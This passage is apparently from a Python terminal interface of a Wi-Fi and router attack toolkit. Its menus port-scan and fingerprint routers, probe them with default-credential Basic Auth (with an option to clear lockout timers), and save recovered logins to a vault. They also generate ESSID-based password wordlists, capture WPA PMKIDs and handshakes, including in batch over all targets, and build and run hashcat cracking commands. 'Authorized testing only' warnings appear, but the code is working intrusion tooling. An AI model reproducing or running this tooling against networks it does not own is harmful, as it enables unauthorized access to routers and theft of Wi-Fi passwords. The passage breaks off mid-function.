                    "brand", "attempts_in_window", "total_attempts",
                    "last_attempt_at", "last_auth_status", "lockout_until",
                    "lockout_count", "verified_at",
                ):
                    if state.get(key) not in (None, ""):
                        t.add_row(key, str(state.get(key)))
                con.print(Panel(t, title="Probe memory", border_style="cyan"))
                if not decision.get("allowed"):
                    if Confirm.ask("Clear lockout timer for this IP?", default=False):
                        self.db.clear_probe_lockout(router_ip)
                        con.print("[ok]Cleared lockout_until[/]")
                Prompt.ask("\n[dim]Enter[/]")

            elif ch in ("1", "2", "3", "4"):
                ok, value = validate_target_ip(router_ip)
                if not ok:
                    con.print("[err]Invalid target: {msg}[/]".format(msg=value))
                    Prompt.ask("\n[dim]Enter[/]")
                    continue
                router_ip = value

                # Manual confirmation before any network activity
                action_labels = {
                    "1": "TCP/HTTP port scan",
                    "2": "Fingerprint (port scan if needed + HTTP read)",
                    "3": "Default credential Basic Auth probe",
                    "4": "Full audit (scan + fingerprint + optional creds)",
                }
                smart_line = "Probe policy: smart (ZTE/Huawei max 3, delay 1.5s, lockout ~60s)"
                if ch in ("3", "4"):
                    # Show real policy, not a misleading pre-fingerprint count
                    zte = policy_for_brand("ZTE")
                    gen = policy_for_brand("generic")
                    smart_line = (
                        "Smart Basic Auth budget: ZTE/Huawei max {z} · "
                        "generic max {g} · auto-stop on lockout/baseline"
                    ).format(z=zte["max_attempts"], g=gen["max_attempts"])

                con.print(Panel(
                    "Target: [inf]{ip}[/]\n"
                    "Action: {action}\n"
                    "{smart}\n"
                    "[warn]Only test systems you own / have permission for.\n"
                    "You must restart from this project folder after updates.[/]".format(
                        ip=router_ip,
                        action=action_labels[ch],
                        smart=smart_line if ch in ("3", "4") else "No credential probe in this action",
                    ),
                    title="Confirm",
                    border_style="yellow",
                ))
                if not Confirm.ask("Proceed?", default=False):
                    continue

                exp = RouterExploiter(router_ip, callback=_cb, db=self.db)

                if ch == "1":
                    with con.status("[ok]Scanning ports...[/]", spinner="dots"):
                        ports = exp.scan_ports()
                    _print_ports(ports)
                    report = {
                        "ip": router_ip,
                        "started_at": datetime.now().isoformat(timespec="seconds"),
                        "finished_at": datetime.now().isoformat(timespec="seconds"),
                        "steps": ["tcp_port_scan"],
                        "open_ports": ports,
                        "fingerprint": {},
                        "credentials": [],
                        "auth_status": "skipped",
                        "summary": "Port scan only ({n} open)".format(n=len(ports)),
                        "warnings": ["Authorized testing only"],
                    }
                    if Confirm.ask("Save this scan?", default=True):
                        _save_report(report)
                    Prompt.ask("\n[dim]Enter[/]")

                elif ch == "2":
                    with con.status("[ok]Scanning + fingerprint...[/]", spinner="dots"):
                        exp.scan_ports()
                        info = exp.fingerprint()
                    _print_ports(exp.open_ports)
                    _print_fingerprint(info)
                    report = {
                        "ip": router_ip,
                        "started_at": datetime.now().isoformat(timespec="seconds"),
                        "finished_at": datetime.now().isoformat(timespec="seconds"),
                        "steps": ["tcp_port_scan", "fingerprint"],
                        "open_ports": exp.open_ports,
                        "fingerprint": info,
                        "credentials": [],
                        "auth_status": "skipped",
                        "summary": "Fingerprint {brand} conf={conf}".format(
                            brand=info.get("brand"),
                            conf=info.get("confidence"),
                        ),
                        "warnings": ["Authorized testing only"],
                    }
                    if Confirm.ask("Save fingerprint report?", default=True):
                        _save_report(report)
                    Prompt.ask("\n[dim]Enter[/]")

                elif ch == "3":
                    with con.status("[ok]Preparing target...[/]", spinner="dots"):
                        exp.scan_ports()
                        info = exp.fingerprint()
                    _print_fingerprint(info)
                    brand = info.get("brand") or "generic"
                    plan = exp.get_smart_plan(brand=brand)
                    decision = plan.get("decision") or {}
                    planned = build_cred_list(
                        brand, True, int(plan.get("max_attempts") or 3)
                    )
                    plan_text = (
                        "{human}\n"
                        "Brand policy: max={maxa} delay={delay}s lockout~{lock}s\n"
                        "Planned pairs: {n}"
                    ).format(
                        human=decision.get("human", ""),
                        maxa=plan.get("max_attempts"),
                        delay=plan.get("delay"),
                        lock=plan.get("lockout_pause"),
                        n=len(planned),
                    )
                    con.print(Panel(
                        plan_text,
                        title="Smart probe plan",
                        border_style="yellow",
                    ))
                    if not decision.get("allowed", True):
                        con.print(
                            "[err]Blocked until {until} ({sec}s)[/]".format(
                                until=decision.get("unlock_at"),
                                sec=decision.get("wait_seconds"),
                            )
                        )
                        if Confirm.ask("Clear lockout timer anyway?", default=False):
                            self.db.clear_probe_lockout(router_ip)
                            con.print("[ok]Lockout timer cleared locally[/]")
                        Prompt.ask("\n[dim]Enter[/]")
                        continue
                    if not Confirm.ask("Start credential probe?", default=False):
                        continue
                    with con.status("[ok]Probing defaults (smart)...[/]", spinner="dots"):
                        creds = exp.try_default_creds(respect_smart_policy=True)
                    _print_creds(creds)
                    report = {
                        "ip": router_ip,
                        "started_at": datetime.now().isoformat(timespec="seconds"),
                        "finished_at": datetime.now().isoformat(timespec="seconds"),
                        "steps": [
                            "tcp_port_scan",
                            "fingerprint",
                            "default_basic_auth_probe",
                        ],
                        "open_ports": exp.open_ports,
                        "fingerprint": info,
                        "credentials": creds,
                        "auth_status": (
                            "success"
                            if any(c.get("status") == "success" for c in creds)
                            else (
                                "possible"
                                if any(c.get("status") == "possible" for c in creds)
                                else "failed"
                            )
                        ),
                        "summary": "Credential probe finished",
                        "warnings": [
                            "Authorized testing only",
                            "Default web login is not a Wi-Fi PSK",
                        ],
                    }
                    if Confirm.ask("Save audit?", default=True):
                        _save_report(report)
                    # Offer vault save only for verified successes
                    verified = [c for c in creds if c.get("status") == "success"]
                    if verified and Confirm.ask(
                        "Also store verified web login in credentials vault?",
                        default=False,
                    ):
                        c0 = verified[0]
                        self.db.add_credential(
                            bssid=router_ip,
                            essid="router-web:{ip}".format(ip=router_ip),
                            pin=None,
                            psk="{u}:{p}".format(
                                u=c0.get("username") or "",
                                p=c0.get("password") or "",
                            ),
                            method="Router Web Default (Basic Auth)",
                        )
                        con.print("[ok]Stored as method=Router Web Default[/]")
                    Prompt.ask("\n[dim]Enter[/]")

                elif ch == "4":
                    run_creds = Confirm.ask(
                        "Include default credential probe?", default=True
                    )
                    run_online = False
                    if Confirm.ask(
                        "Also query NVD online for CVE keywords? (needs internet)",
                        default=False,
                    ):
                        run_online = True
                    with con.status("[ok]Running full audit...[/]", spinner="dots"):
                        report = exp.full_exploit(
                            try_creds=run_creds,
                            respect_smart_policy=True,
                            include_vuln_intel=True,
                            vuln_online=run_online,
                        )
                    _print_ports(report.get("open_ports") or [])
                    _print_fingerprint(report.get("fingerprint") or {})
                    plan = report.get("probe_plan") or {}
                    if plan:
                        dec = plan.get("decision") or {}
                        con.print(Panel(
                            str(dec.get("human") or ""),
                            title="Smart probe",
                            border_style="yellow",
                        ))
                    intel = report.get("vuln_intel") or {}
                    cves = intel.get("cves") or []
                    if cves:
                        vt = Table(box=box.ROUNDED, show_header=True,
                                   header_style="bold cyan",
                                   title="[hdr]CVE / Exploit-DB references[/]")
                        vt.add_column("CVE", min_width=14)
                        vt.add_column("Sev", width=8)
                        vt.add_column("Summary")
                        for cve in cves[:8]:
                            vt.add_row(
                                str(cve.get("cve_id") or ""),
                                str(cve.get("severity") or ""),
                                str(cve.get("summary") or "")[:70],
                            )
                        con.print(vt)
                        links = intel.get("search_links") or {}
                        if links:
                            con.print("[dim]NVD: {u}[/]".format(u=links.get("nvd")))
                            con.print("[dim]Exploit-DB: {u}[/]".format(
                                u=links.get("exploit_db")
                            ))
                        con.print(
                            "[warn]References only — no payloads. "
                            "Verify firmware before conclusions.[/]"
                        )
                    if run_creds:
                        _print_creds(report.get("credentials") or [])
                    con.print(
                        Panel(
                            "Auth: {auth}\nSummary: {summary}".format(
                                auth=report.get("auth_status"),
                                summary=report.get("summary"),
                            ),
                            title="Audit result",
                            border_style="cyan",
                        )
                    )
                    if Confirm.ask("Save full audit?", default=True):
                        _save_report(report)
                    verified = [
                        c for c in (report.get("credentials") or [])
                        if c.get("status") == "success"
                    ]
                    if verified and Confirm.ask(
                        "Store verified web login in credentials vault?",
                        default=False,
                    ):
                        c0 = verified[0]
                        self.db.add_credential(
                            bssid=router_ip,
                            essid="router-web:{ip}".format(ip=router_ip),
                            pin=None,
                            psk="{u}:{p}".format(
                                u=c0.get("username") or "",
                                p=c0.get("password") or "",
                            ),
                            method="Router Web Default (Basic Auth)",
                        )
                        con.print("[ok]Stored in vault[/]")
                    Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: WORDLIST GENERATOR
    # ═══════════════════════════════════════
    def view_wordlist(self):
        """Smart wordlist generator"""
        while True:
            con.clear()
            con.print(Rule("[hdr]Wordlist Generator[/]", style="cyan"))

            con.print("\n  [mn]1[/] - Generate for Specific Network")
            con.print("  [mn]2[/] - Generate for All Targets")
            con.print("  [mn]3[/] - Quick Wordlist from ESSID")
            con.print("  [mn]4[/] - REALISTIC 500,000 (MA / 8-12 balanced)")
            con.print("  [mn]5[/] - MEGA Morocco 5,000,000 (heavy)")
            con.print("  [mn]6[/] - MEGA 1,000,000 quick pack")
            con.print("  [mn]7[/] - CLI build info / attribution")
            con.print("  [mn]0[/] - Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break

            elif ch == "1":
                essid = Prompt.ask("ESSID (network name)")
                brand = Prompt.ask("Brand (TP-Link/ZTE/Huawei/etc)", default="")
                max_w = IntPrompt.ask("Max words", default=250000)

                con.print(f"\n[inf]Generating wordlist for '{essid}'...[/]")
                gen = WordlistGenerator()
                words = gen.generate_for_network(essid, brand=brand, max_words=max_w)

                con.print(f"[ok]Generated {len(words)} passwords[/]")

                # Show sample
                con.print("\nSample:")
                for w in words[:20]:
                    con.print(f"  {w}")
                if len(words) > 20:
                    con.print(f"  ... and {len(words)-20} more")

                if Confirm.ask("\nSave to file?", default=True):
                    fname = Prompt.ask("Filename", default=f"/tmp/wl_{essid.replace(' ','_')}.txt")
                    count = gen.save_to_file(fname, max_w)
                    con.print(f"[ok]Saved {count} passwords to {fname}[/]")

                Prompt.ask("\n[dim]Enter[/]")

            elif ch == "2":
                tgts = self.db.get_targets()
                if not tgts:
                    con.print("[warn]No targets[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    continue

                gen = WordlistGenerator()
                all_words = set()

                for t in tgts:
                    essid = str(_get_field(t, "essid", ""))
                    if essid and essid != "Hidden":
                        words = gen.generate_from_essid(essid)
                        all_words.update(words)

                con.print(f"[ok]Generated {len(all_words)} unique passwords[/]")

                fname = Prompt.ask("Filename", default="/tmp/wl_targets.txt")
                with open(fname, "w") as f:
                    for w in sorted(all_words):
                        f.write(w + "\n")
                con.print(f"[ok]Saved to {fname}[/]")
                Prompt.ask("\n[dim]Enter[/]")

            elif ch == "3":
                essid = Prompt.ask("ESSID")
                gen = WordlistGenerator()
                words = gen.generate_from_essid(essid)
                con.print(f"\n[ok]{len(words)} passwords:[/]")
                for w in words[:30]:
                    con.print(f"  {w}")
                if len(words) > 30:
                    con.print(f"  ... +{len(words)-30} more")
                Prompt.ask("\n[dim]Enter[/]")

    def view_handshake(self):
        """WPA Handshake Capture & Analysis"""
        while True:
            con.clear()
            con.print(Rule("[hdr]Handshake Capture & Analysis[/]", style="cyan"))
            con.print("[dim]Managed PMKID requests and passive authorized handshakes[/]")
            con.print()
            con.print("  [mn]1[/] - Capture PMKID (managed mode)")
            con.print("  [mn]2[/] - Passive Real Handshake (monitor mode)")
            con.print("  [mn]3[/] - M1/M2 Diagnostic (dummy PSK)")
            con.print("  [mn]4[/] - Capture PMKID from Targets")
            con.print("  [mn]5[/] - Analyze Captures")
            con.print("  [mn]6[/] - List All Captures")
            con.print("  [mn]7[/] - Crack Command")
            con.print("  [mn]8[/] - WPS survey (wash) if installed")
            con.print("  [mn]0[/] - Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                self._capture_pmkid()
            elif ch == "2":
                self._capture_passive()
            elif ch == "3":
                self._capture_full()
            elif ch == "4":
                self._capture_batch()
            elif ch == "5":
                self._analyze_captures()
            elif ch == "6":
                self._list_captures()
            elif ch == "7":
                self._crack_cmd()
            elif ch == "8":
                self._wash_survey()

    def _select_target(self, fresh_scan=False):
        """Select from a fresh radio scan, not a cumulative database list."""
        nets = []

        if fresh_scan:
            preferred_iface = self.cfg.get("interface", "wlan0")
            timeout = self.cfg.get("scan_timeout", 20)
            scan_ifaces = [preferred_iface]
            for available_iface in get_interfaces():
                if available_iface not in scan_ifaces:
                    scan_ifaces.append(available_iface)

            scanned = []
            scan_source = ""

            # First try iw on the configured interface, then every other
            # managed interface. On this phone wlan0 and wlan1 share phy0,
            # but often only one of them accepts a scan request.
            for scan_iface in scan_ifaces:
                con.print("\n[inf]Fresh iw scan on {iface}...[/]".format(
                    iface=scan_iface
                ))
                try:
                    candidate = scan_iw(scan_iface, timeout, wps_only=False)
                except Exception as exc:
                    con.print("[warn]Scan failed on {iface}: {err}[/]".format(
                        iface=scan_iface, err=exc
                    ))
                    candidate = []
                if candidate:
                    scanned = candidate
                    scan_source = "iw/{iface}".format(iface=scan_iface)
                    break

            # If direct iw scan is rejected by the Android driver, use the
            # scan cache of an already-running wpa_supplicant instance.
            if not scanned:
                for scan_iface in scan_ifaces:
                    wpa = WpaSupplicant(scan_iface)
                    if not wpa.is_running():
                        continue
                    con.print("[inf]Trying wpa_cli scan on {iface}...[/]".format(
                        iface=scan_iface
                    ))
                    try:
                        candidate = wpa.scan_results()
                    except Exception as exc:
                        con.print("[warn]wpa_cli failed on {iface}: {err}[/]".format(
                            iface=scan_iface, err=exc
                        ))
                        candidate = []
                    if candidate:
                        scanned = candidate
                        scan_source = "wpa_cli/{iface}".format(iface=scan_iface)
                        break

            # Show every AP from this scan. The Enc column tells the user
            # which ones are WPA2 candidates; do not hide networks because
            # one vendor's iw output used an unexpected RSN format.
            nets = scanned
            wpa2_count = 0
            for network in nets:
                security = str(_get_field(network, "encryption", "")).upper()
                if "WPA2" in security:
                    wpa2_count += 1
                self.db.add_network(network)

            if nets:
                con.print(
                    "[ok]{count} current networks via {source}; "
                    "{wpa2} detected as WPA2[/]\n".format(
                        count=len(nets), source=scan_source, wpa2=wpa2_count
                    )
                )
            else:
                tried = ", ".join(scan_ifaces) if scan_ifaces else preferred_iface
                con.print("[warn]No current scan results from: {ifaces}[/]".format(
                    ifaces=tried
                ))
                use_saved = Confirm.ask("Use saved database entries instead?", default=False)
                if use_saved:
                    nets = self.db.get_all_networks()
        else:
            nets = self.db.get_all_networks()

        if nets:
            net_table(nets, "Fresh Targets" if fresh_scan else "Select Target")
            sel = Prompt.ask("# or M for manual", default="1")
            if sel.strip().lower() != "m":
                try:
                    idx = int(sel)
                    if 1 <= idx <= len(nets):
                        network = nets[idx - 1]
                        bssid = str(_get_field(network, "bssid"))
                        essid = str(_get_field(network, "essid", "Hidden"))
                        return bssid, essid
                except ValueError:
                    pass
                con.print("[warn]Invalid selection; enter the target manually.[/]")

        bssid = Prompt.ask("BSSID", default="").strip().upper()
        if not bssid:
            return "", ""
        essid = Prompt.ask("ESSID (exact, case-sensitive)", default="Unknown")
        return bssid, essid


    def _wash_survey(self):
        """Optional wash-based WPS lock/version survey."""
        con.clear()
        con.print(Rule("[hdr]WPS Survey (wash)[/]", style="cyan"))
        from modules.wps_survey import wash_available, survey_wps
        if not wash_available():
            con.print("[err]wash not installed.[/]")
            con.print("[dim]On Kali/Debian: apt install reaver  (provides wash)[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return
        iface = self.cfg.get("interface", "wlan0")
        timeout = IntPrompt.ask("Survey seconds", default=20)
        con.print("[warn]Authorized area only. wash uses monitor-capable interface when possible.[/]")
        if not Confirm.ask("Start wash survey?", default=True):
            return
        with con.status("[ok]Running wash...[/]", spinner="dots"):
            result = survey_wps(iface, timeout=timeout)
        if not result.get("ok") and not result.get("rows"):
            con.print("[err]{e}[/]".format(e=result.get("error") or "wash failed"))
            Prompt.ask("\n[dim]Enter[/]")
            return
        rows = result.get("rows") or []
        con.print("[ok]{n} WPS rows[/]".format(n=len(rows)))
        t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
        t.add_column("BSSID")
        t.add_column("CH")
        t.add_column("RSSI")
        t.add_column("WPS")
        t.add_column("Lock")
        t.add_column("Vendor")
        t.add_column("ESSID")
        for r in rows[:40]:
            t.add_row(
                r.get("bssid", ""),
                str(r.get("channel", "")),
                str(r.get("rssi", "")),
                str(r.get("wps_version", "")),
                str(r.get("wps_locked", "")),
                str(r.get("vendor", ""))[:12],
                str(r.get("essid", ""))[:18],
            )
            # merge into DB
            try:
                self.db.add_network({
                    "bssid": r.get("bssid"),
                    "essid": r.get("essid"),
                    "channel": r.get("channel"),
                    "rssi": r.get("rssi"),
                    "has_wps": 1,
                    "wps_locked": r.get("wps_locked"),
                    "wps_version": r.get("wps_version"),
                    "encryption": "WPA2",
                    "source": "wash",
                })
            except Exception:
                pass
        con.print(t)
        Prompt.ask("\n[dim]Enter[/]")

    def _capture_pmkid(self, preset_target=None):
        con.clear()
        con.print(Rule("[hdr]PMKID Capture[/]", style="cyan"))
        con.print(
            "[warn]A PMKID is available only when the AP includes one in M1/RSN.\n"
            "Retries cannot force an AP that does not expose PMKID.\n"
            "Use hashcat mode 22000 on the saved .hc22000 file.[/]\n"
        )
        if preset_target:
            bssid, essid = preset_target
        else:
            bssid, essid = self._select_target(fresh_scan=True)
        if not bssid:
            return

        saved = self.db.get_network(bssid)
        def _sf(key, default=""):
            if saved is None:
                return default
            return _get_field(saved, key, default)
        assess_net = {
            "bssid": bssid,
            "essid": essid or str(_sf("essid", "Unknown") or "Unknown"),
            "rssi": int(_sf("rssi", 0) or 0),
            "channel": int(_sf("channel", 0) or 0),
            "encryption": str(_sf("encryption", "WPA2") or "WPA2"),
            "has_wps": int(_sf("has_wps", 0) or 0),
            "wps_locked": str(_sf("wps_locked", "Unknown") or "Unknown"),
            "wps_version": str(_sf("wps_version", "") or ""),
            "wps_model": str(_sf("wps_model", "") or ""),
            "wps_device": str(_sf("wps_device", "") or ""),
        }
        hist = history_from_db(self.db, bssid)
        report = TargetAssessor(history=hist).assess(assess_net)
        pb = report.get("playbook") or build_playbook(
            {"bssid": bssid, "essid": essid, "wps_model": report.get("model"), "rssi": report.get("rssi")},
            report,
        )
        sig = evaluate_signal(report.get("rssi") or 0)
        con.print("  Target: [inf]{e}[/] ({b})".format(e=essid, b=bssid))
        con.print("  Playbook: {p} | signal: {s}".format(p=pb.get("label"), s=sig.get("message")))
        if sig.get("level") == "block":
            con.print("[warn]{m}[/]".format(m=sig.get("message")))
            if not Confirm.ask("Continue PMKID attempt anyway?", default=False):
                return

        # Optional wash lock enrichment (does not block PMKID)
        try:
            from modules.wps_survey import wash_available, survey_wps, lookup_bssid
            if wash_available() and Confirm.ask("Optional: quick wash WPS survey first?", default=False):
                iface0 = self.cfg.get("interface", "wlan0")
                with con.status("[ok]wash survey...[/]", spinner="dots"):
                    survey = survey_wps(iface0, timeout=15)
                row = lookup_bssid(survey.get("rows"), bssid)
                if row:
                    con.print(
                        "  wash: WPS {v} lock={l} vendor={ven}".format(
                            v=row.get("wps_version"), l=row.get("wps_locked"), ven=row.get("vendor")
                        )
                    )
                else:
                    con.print("[dim]wash: target not listed in short survey[/]")
        except Exception as exc:
            con.print("[dim]wash skipped: {e}[/]".format(e=exc))

        # Seed smart wordlist path for later crack
        try:
            cands = candidates_for_target(
                essid=essid, bssid=bssid,
                model=str(report.get("model") or ""),
                manufacturer=str(report.get("manufacturer") or ""),
                limit=30,
            )
            if cands:
                from pathlib import Path as _P
                wl = _P("/tmp/wps_toolkit_isp_candidates.txt")
                with open(wl, "w", encoding="utf-8") as handle:
                    for c in cands:
                        handle.write(c["password"] + "\n")
                con.print(
                    "[dim]Wrote {n} offline password candidates → {p}[/]".format(
                        n=len(cands), p=wl
                    )
                )
        except Exception:
            pass

        if not Confirm.ask("Start managed PMKID capture?", default=True):
            return

        iface = self.cfg.get("interface", "wlan0")
        cap = HandshakeCapture(iface)
        cap.callback = lambda l: con.print("[dim]{line}[/]".format(line=l))
        try:
            result = cap.capture_pmkid(bssid, essid, timeout=25, retries=2)
        except KeyboardInterrupt:
            result = {"status": "stopped"}

        con.print("\n  Status: {st}".format(st=result.get("status")))
        if result.get("pmkid"):
            con.print("  PMKID: [ok]{v}[/]".format(v=result["pmkid"]))
            con.print("  Crack: [cyan]hashcat -m 22000 <file> wordlist.txt[/]")
            for f in result.get("files") or []:
                if "pmkid_" in f or str(f).endswith(".hc22000"):
                    con.print("  File: [ok]{f}[/]".format(f=f))
                    con.print(
                        "  Tip: hashcat -m 22000 {f} /tmp/wps_toolkit_isp_candidates.txt".format(f=f)
                    )
            try:
                self.db.log("pmkid", "capture", "PMKID for {b}".format(b=bssid), "info")
            except Exception:
                pass
        else:
            con.print("[warn]No PMKID was exposed by this AP.[/]")
            con.print(
                "[dim]Next: passive handshake (menu 9→2) with a client you own, "
                "or WPS path if playbook allows.[/]"
            )
            if pb.get("primary"):
                con.print("[dim]Playbook primary: {p}[/]".format(p=pb.get("primary")))

        try:
            ev = write_attack_evidence(
                bssid, essid, "pmkid", result=result, assessment=report, playbook=pb
            )
            self.db.save_evidence_index(bssid, essid, "pmkid", result.get("status"), ev)
            note = write_lab_note_md(ev)
            if note:
                con.print("[dim]Lab note: {p}[/]".format(p=note))
            con.print("[dim]Evidence: {p}[/]".format(p=ev))
        except Exception as exc:
            con.print("[dim]Evidence skipped: {e}[/]".format(e=exc))
        Prompt.ask("\n[dim]Enter[/]")

    def _capture_passive(self, preset_target=None, preset_channel=None):
        """Capture an authorized client handshake on a fixed monitor channel."""
        con.clear()
        con.print(Rule("[hdr]Passive Real Handshake[/]", style="cyan"))
        con.print(
            "[warn]Authorized testing only. This mode does not deauthenticate clients.\n"
            "Use another device that you own: disconnect it, start capture, then\n"
            "reconnect it using the real network password.[/]\n"
        )

        iface = self.cfg.get("interface", "wlan0")
        if get_mode(iface) == "monitor":
            con.print("[dim]Restoring managed mode temporarily for the target scan...[/]")
            disable_monitor(iface)
            iface = "wlan0"
            self.cfg.set("interface", iface)

        if preset_target:
            bssid, essid = preset_target
        else:
            bssid, essid = self._select_target(fresh_scan=True)
        if not bssid:
            return

        saved = self.db.get_network(bssid)
        default_channel = 8
        if preset_channel:
            try:
                default_channel = int(preset_channel)
            except (TypeError, ValueError):
                default_channel = 8
        if saved:
            if not preset_channel:
                try:
                    saved_channel = int(_get_field(saved, "channel", 0))
                    if saved_channel > 0:
                        default_channel = saved_channel
                except (TypeError, ValueError):
                    pass

            try:
                saved_rssi = int(_get_field(saved, "rssi", 0))
            except (TypeError, ValueError):
                saved_rssi = 0
            if saved_rssi <= -85:
                con.print(
                    "[warn]Very weak target signal ({rssi} dBm). Move closer; "
                    "EAPOL data frames are harder to receive than beacons.[/]".format(
                        rssi=saved_rssi
                    )
                )

            security = str(_get_field(saved, "encryption", "Unknown")).upper()
            if security in ("WEP", "OPEN"):
                con.print(
                    "[warn]Scanner currently reports {security}. WPA EAPOL "
                    "handshakes do not exist on that security type.[/]".format(
                        security=security
                    )
                )

        channel = IntPrompt.ask("Target channel", default=default_channel)
        width_default = 0
        width = IntPrompt.ask(
            "Width: 0=20MHz, 1=40MHz, 2=80MHz",
            default=width_default,
        )
        duration = IntPrompt.ask("Capture duration in seconds", default=60)

        con.print("\n  Target: [inf]{essid}[/] ({bssid})".format(
            essid=essid,
            bssid=bssid,
        ))
        con.print("  Channel: [inf]{channel}[/]  Duration: [inf]{duration}s[/]\n".format(
            channel=channel,
            duration=duration,
        ))
        con.print(
            "[hdr]Prepare the authorized client now:[/]\n"
            "  1. Turn Wi-Fi off on the second device.\n"
            "  2. Start this capture.\n"
            "  3. Turn Wi-Fi on and reconnect to the target during the timer.\n"
        )

        if not Confirm.ask("Start passive capture?", default=True):
            return

        capture = PassiveHandshakeCapture(iface)
        capture.callback = lambda line: con.print("[dim]{line}[/]".format(line=line))

        try:
            result = capture.capture(
                bssid=bssid,
                essid=essid,
                channel=channel,
                width=width,
                duration=duration,
                restore=True,
            )
        except KeyboardInterrupt:
            result = {"status": "stopped", "files": []}
        finally:
            self.cfg.set("interface", "wlan0")

        status = result.get("status", "failed")
        con.print("\n  Status: [inf]{status}[/]".format(status=status))
        con.print("  Target EAPOL: {count}".format(
            count=result.get("eapol_frames", 0)
        ))
        con.print("  Authorized hashes: {count}".format(
            count=result.get("hashes", 0)
        ))

        if status == "handshake_captured":
            con.print("[ok]Real authorized handshake captured and validated.[/]")
        elif status == "challenge_only":
            con.print("[warn]Only a challenge pair was found. Reconnect a client"
                      " that knows the real password.[/]")
        elif status == "no_eapol":
            con.print("[warn]No EAPOL for this BSSID. Verify the channel and retry.[/]")
        elif status == "missing_tools":
            missing = ", ".join(result.get("missing", []))
            con.print("[err]Missing tools: {items}[/]".format(items=missing))

        for filepath in result.get("files", []):
            con.print("  File: [dim]{path}[/]".format(path=filepath))
        Prompt.ask("\n[dim]Enter[/]")

    def _capture_full(self):
        con.clear()
        con.print(Rule("[hdr]M1/M2 Diagnostic[/]", style="cyan"))
        con.print("[warn]Important: M2 generated here uses a random dummy PSK.\n"
                  "It tests EAPOL parsing, but it cannot reveal the AP's real password.\n"
                  "A real crackable handshake requires a legitimate client handshake\n"
                  "captured with monitor-capable hardware.[/]\n")
        bssid, essid = self._select_target(fresh_scan=True)
        if not bssid:
            return
        con.print(f"\n  Target: [inf]{essid}[/] ({bssid})\n")
        iface = self.cfg.get("interface", "wlan1")
        cap = HandshakeCapture(iface)
        cap.callback = lambda l: con.print(f"[dim]{l}[/]")
        try:
            result = cap.capture_via_connect(bssid, essid, timeout=30)
        except KeyboardInterrupt:
            result = {"status": "stopped"}
        con.print(f"\n  Status: {result.get('status')}")
        if result.get("pmkid"):
            con.print(f"  PMKID: [ok]{result['pmkid']}[/]")
        if result.get("anonce"):
            con.print(f"  ANonce: [ok]{result['anonce'][:32]}...[/]")
        if result.get("num_frames"):
            con.print(f"  EAPOL frames: {result['num_frames']}")
        if result.get("files"):
            for f in result["files"]:
                con.print(f"  File: [dim]{f}[/]")
        Prompt.ask("\n[dim]Enter[/]")

    def _capture_batch(self):
        con.clear()
        con.print(Rule("[hdr]Batch Capture[/]", style="cyan"))
        tgts = self.db.get_targets()
        if not tgts:
            con.print("[warn]No targets[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return
        con.print(f"  Targets: {len(tgts)}\n")
        iface = self.cfg.get("interface", "wlan1")
        captured = 0
        for t in tgts:
            bssid = str(_get_field(t, "bssid"))
            essid = str(_get_field(t, "essid", "Hidden"))
            con.print(f"[inf]{essid}[/] ({bssid})")
            cap = HandshakeCapture(iface)
            try:
                r = cap.capture_pmkid(bssid, essid, timeout=15)
                if "captured" in r.get("status", ""):
                    captured += 1
                    con.print(f"  [ok]CAPTURED![/]")
                else:
                    con.print(f"  [dim]{r.get('status')}[/]")
            except Exception as e:
                con.print(f"  [err]{e}[/]")
        con.print(f"\n  [hdr]{captured}/{len(tgts)} captured[/]")
        Prompt.ask("\n[dim]Enter[/]")

    def _analyze_captures(self):
        con.clear()
        con.print(Rule("[hdr]Analyze Captures[/]", style="cyan"))
        caps = HandshakeAnalyzer.list_captures()
        if not caps:
            con.print("[warn]No captures[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return
        t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
        t.add_column("#", width=3); t.add_column("File"); t.add_column("Type")
        t.add_column("BSSID"); t.add_column("Crackable")
        for i, c in enumerate(caps, 1):
            ct = "[ok]Yes[/]" if c.get("crackable") else "[dim]No[/]"
            t.add_row(str(i), Path(c["file"]).name, c.get("type","?"),
                     c.get("bssid","-"), ct)
        con.print(t)
        sel = Prompt.ask("# to analyze (Enter skip)", default="")
        if sel:
            try:
                idx = int(sel) - 1
                if 0 <= idx < len(caps):
                    c = caps[idx]
                    con.print(f"\n  File: {c['file']}")
                    con.print(f"  Type: {c.get('type')}")
                    con.print(f"  Crackable: {c.get('crackable')}")
                    for s in c.get("suggestions", []):
                        con.print(f"  [cyan]{s}[/]")
            except: pass
        Prompt.ask("\n[dim]Enter[/]")

    def _list_captures(self):
        con.clear()
        con.print(Rule("[hdr]All Captures[/]", style="cyan"))
        caps = HandshakeAnalyzer.list_captures()
        if not caps:
            con.print("[warn]None[/]")
        else:
            for c in caps:
                con.print(f"  {Path(c['file']).name}")
                con.print(f"    Type: {c.get('type','?')} | {c.get('bssid','-')}")
        Prompt.ask("\n[dim]Enter[/]")

    def _crack_cmd(self):
        con.clear()
        con.print(Rule("[hdr]Crack Command[/]", style="cyan"))
        caps = HandshakeAnalyzer.list_captures()
        if not caps:
            con.print("[warn]No captures[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return
        for i, c in enumerate(caps, 1):
            con.print("  [{i}] {name}".format(i=i, name=Path(c["file"]).name))
        sel = IntPrompt.ask("Select #", default=1)
        if 1 <= sel <= len(caps):
            fp = caps[sel - 1]["file"]
            default_wl = self.cfg.get(
                "wordlist", "/usr/share/wordlists/rockyou.txt"
            )
            if Path("/tmp/wps_toolkit_isp_candidates.txt").exists():
                default_wl = "/tmp/wps_toolkit_isp_candidates.txt"
            wl = Prompt.ask("Wordlist", default=default_wl)
            self.cfg.set("wordlist", wl)
            cmd = HandshakeAnalyzer.get_crack_command(fp, wl)
            if cmd:
                con.print("\n  [cyan]{cmd}[/]".format(cmd=cmd))
                # Always show modern hashcat mode tip
                con.print(
                    "[dim]Modern WPA/PMKID files: hashcat -m 22000 {fp} {wl}[/]".format(
                        fp=fp, wl=wl
                    )
                )
                if Confirm.ask("Run?", default=False):
                    try:
                        proc = subprocess.Popen(
                            cmd.split(),
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT,
                            text=True,
